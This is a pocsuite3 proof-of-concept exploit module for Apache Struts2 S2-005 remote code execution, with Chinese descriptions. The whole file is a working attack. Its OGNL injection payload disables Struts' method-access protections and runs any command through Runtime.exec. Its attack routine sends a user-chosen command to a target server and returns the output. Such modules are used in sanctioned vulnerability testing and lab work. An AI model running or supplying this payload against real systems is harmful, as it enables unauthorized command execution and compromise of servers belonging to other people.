
from collections import OrderedDict
from requests.exceptions import ReadTimeout
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE, OptString


class DemoPOC(POCBase):
    vulID = '0'  # ssvid
    version = '1'
    appName = 'Struts2'
    appVersion = '2.0.0 - 2.1.8.1'
    name = 'Struts2-005远程代码执行'
    desc = '''Struts2-005远程代码执行'''
    pocDesc = '''Struts2-005远程代码执行'''
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    protocol = POC_CATEGORY.PROTOCOL.HTTP
    references = ['https://github.com/vulhub/vulhub/blob/master/struts2/s2-005/README.zh-cn.md']

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description='攻击时自定义命令')
        return o

    def _verify(self):
        result = {}
        HEADERS = {
            'Accept': 'application/x-shockwave-flash,'
                      'image/gif,'
                      'image/x-xbitmap,'
                      'image/jpeg,'
                      'image/pjpeg,'
                      'application/vnd.ms-excel,'
                      'application/vnd.ms-powerpoint,'
                      'application/msword,'
                      '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        url = self.url
        cmd = "echo VuLnEcHoPoCSuCCeSS"
        payload = r"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.Method" \
            r"Accessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.ut" \
            r"il.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'RECOMMAND\'')(d))&(h)(('\43myret\75@java.lang.Runtim" \
            r"e@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputSt" \
            r"ream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('" \
            r"\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionCo" \
            r"ntext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))"
        payload = payload.replace("RECOMMAND", cmd)
        flag = "VuLnEcHoPoCSuCCeSS"

        try:
            response = requests.post(url, headers=HEADERS, data=payload)
            if response and response.status_code == 200 and flag in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Postdata'] = payload
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        result = {}
        HEADERS = {
            'Accept': 'application/x-shockwave-flash,'
                      'image/gif,'
                      'image/x-xbitmap,'
                      'image/jpeg,'
                      'image/pjpeg,'
                      'application/vnd.ms-excel,'
                      'application/vnd.ms-powerpoint,'
                      'application/msword,'
                      '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        url = self.url
        cmd = self.get_option("command")
        payload = r"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.Method" \
                  r"Accessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.ut" \
                  r"il.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'RECOMMAND\'')(d))&(h)(('\43myret\75@java.lang.Runtim" \
                  r"e@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputSt" \
                  r"ream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('" \
                  r"\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionCo" \
                  r"ntext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))"
        payload = payload.replace("RECOMMAND", cmd)

        try:
            response = requests.post(url, headers=HEADERS, data=payload)
            if response and response.status_code == 200:
                result['Stdout'] = response.text
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)


register_poc(DemoPOC)
